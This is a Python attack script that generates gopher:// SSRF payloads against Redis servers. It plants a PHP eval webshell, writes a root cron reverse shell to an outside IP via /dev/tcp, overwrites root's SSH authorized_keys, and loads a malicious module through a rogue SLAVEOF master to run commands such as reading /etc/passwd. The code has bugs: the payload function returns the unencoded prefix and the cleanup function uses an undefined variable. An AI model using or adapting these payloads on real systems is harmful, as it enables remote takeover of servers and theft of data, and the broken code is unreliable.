#!/usr/local/bin python
#coding=utf8

try:
    from urllib import quote
except:
    from urllib.parse import quote

def generate_info(passwd):
    
    cmd=[
        "info",
        "quit"
        ]
    if passwd:
        cmd.insert(0,"AUTH {}".format(passwd))
    return cmd

def generate_shell(filename,path,passwd,payload):
    
    cmd=["flushall",
        "set 1 {}".format(payload),
        "config set dir {}".format(path),
        "config set dbfilename {}".format(filename),
        "save",
        "quit"
        ]
    if passwd:
        cmd.insert(0,"AUTH {}".format(passwd))
    return cmd

def generate_reverse(filename,path,passwd,payload): # centos

    cmd=["flushall",
        "set 1 {}".format(payload),
        "config set dir {}".format(path),
        "config set dbfilename {}".format(filename),
        "save",
        "quit"
        ]
    if passwd:
        cmd.insert(0,"AUTH {}".format(passwd))
    return cmd
    
def generate_sshkey(filename,path,passwd,payload):

    cmd=["flushall",
        "set 1 {}".format(payload),
        "config set dir {}".format(path),
        "config set dbfilename {}".format(filename),
        "save",
        "quit"
        ]
    if passwd:
        cmd.insert(0,"AUTH {}".format(passwd))
    return cmd
    
def generate_rce(lhost,lport,passwd,command="cat /etc/passwd"):

    exp_filename="exp.so"
    cmd=[
        "SLAVEOF {} {}".format(lhost,lport),
        "CONFIG SET dir /tmp/",
        "config set dbfilename {}".format(exp_filename),
        "MODULE LOAD /tmp/{}".format(exp_filename),
        "system.exec {}".format(command.replace(" ","${IFS}")),
        # "SLAVEOF NO ONE",
        # "CONFIG SET dbfilename dump.rdb",
        # "system.exec rm${IFS}/tmp/{}".format(exp_filename),
        # "MODULE UNLOAD system",
        "quit"
        ]
    if passwd:
        cmd.insert(0,"AUTH {}".format(passwd))
    return cmd

def rce_cleanup():
    exp_filename="exp.so"
    cmd=[
        "SLAVEOF NO ONE",
        "CONFIG SET dbfilename dump.rdb",
        "system.exec rm /tmp/{}".format(exp_filename).replace(" ","${IFS}"),
        "MODULE UNLOAD system",
        "quit"
        ]
    if passwd:
        cmd.insert(0,"AUTH {}".format(passwd))
    return cmd

def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x)))+CRLF+x
    cmd+=CRLF
    return cmd

def generate_payload(passwd,mode):

    payload="test"

    if mode ==0:
        filename="shell.php"
        path="/var/www/html"
        shell="\n\n<?=eval($_GET[0]);?>\n\n"

        cmd=generate_shell(filename,path,passwd,shell)

    elif mode==1: 
        filename="root"
        path="/var/spool/cron/"
        shell="\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.1.1/2333 0>&1\n\n"

        cmd=generate_reverse(filename,path,passwd,shell.replace(" ","^"))

    elif mode==2:
        filename="authorized_keys"
        path="/root/.ssh/"
        pubkey="\n\nssh-rsa "

        cmd=generate_sshkey(filename,path,passwd,pubkey.replace(" ","^"))
        
    elif mode==3:
        lhost="192.168.1.100"
        lport="6666"
        command="whoami"

        cmd=generate_rce(lhost,lport,passwd,command)

    elif mode==31:
        cmd=rce_cleanup()

    elif mode==4:
        cmd=generate_info(passwd)

    protocol="gopher://"

    ip="0.0.0.0"
    port="6379"

    payload=protocol+ip+":"+port+"/_"
    payload1=payload

    # 原始版本。不进行编码
    # for x in cmd:
    #     payload += quote(redis_format(x).replace("^"," "))

    # 更换为全ascii编码，仅包含'\0123456789abcde'符号。更稳定
    for x in cmd:

        sentence = redis_format(x).replace("^"," ")
        for c in sentence:
            
            payload1 += "%25{:0>2}".format(hex(ord(c)).replace("0x",""))
   
    return payload

    

if __name__=="__main__":   

    # 0 for webshell ; 1 for re shell ; 2 for ssh key ; 
    # 3 for redis rce ; 31 for rce clean up
    # 4 for info
    # suggest cleaning up when mode 3 used
    mode=0

    # input auth passwd or leave blank for no pw
    passwd = 'root' 

    p=generate_payload(passwd,mode)
    print(p)

